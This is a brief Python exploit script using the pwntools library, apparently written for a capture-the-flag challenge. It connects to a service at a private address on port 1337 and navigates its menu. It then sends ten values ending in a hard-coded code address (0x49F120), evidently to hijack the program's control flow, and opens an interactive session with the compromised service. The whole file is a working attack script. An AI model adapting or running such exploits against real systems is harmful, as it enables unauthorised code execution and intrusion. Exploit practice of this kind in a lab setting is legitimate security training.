import pwn

r = pwn.remote("10.71.9.141", 1337)


def beeps_to_boops(amount, beeps):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"How many: ", str(amount).encode())
    for b in beeps:
        r.sendlineafter(b"> ", str(b).encode())


sheepshoop = 0x49F120

beeps_to_boops(0xA, [0, 0, 0, 0, 0, 0, 0, 0, 0, sheepshoop])

r.interactive()
